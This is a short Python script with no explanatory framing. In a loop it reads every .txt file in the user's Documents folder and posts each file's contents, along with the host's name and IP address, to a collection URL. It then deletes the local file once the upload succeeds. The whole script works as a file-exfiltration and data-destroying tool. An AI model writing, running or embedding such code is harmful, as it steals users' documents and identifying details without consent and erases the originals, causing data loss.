import glob
import os
import time
import socket
import datetime
import requests

URL = 'http://localhost:8080/data'
DATA = {'data': '',
        'ip': socket.gethostbyname(socket.gethostname()),
        'name': socket.gethostname(),
        'timestamp': datetime.datetime.now()
        }
PATH = os.path.expanduser('~')+"\\Documents\\"

while True:
    time.sleep(1800)
    files = glob.glob(PATH+'*.txt', recursive=True)
    for file in files:
        f = open(file, 'r')
        DATA['data'] = f.read()
        f.close()

        DATA['timestamp'] = datetime.datetime.now()

        r = requests.post(URL, data=DATA)
        if r.status_code == 200:
            os.remove(file)
            print('file removed')
        else:
            print("file not removed")
        time.sleep(60)

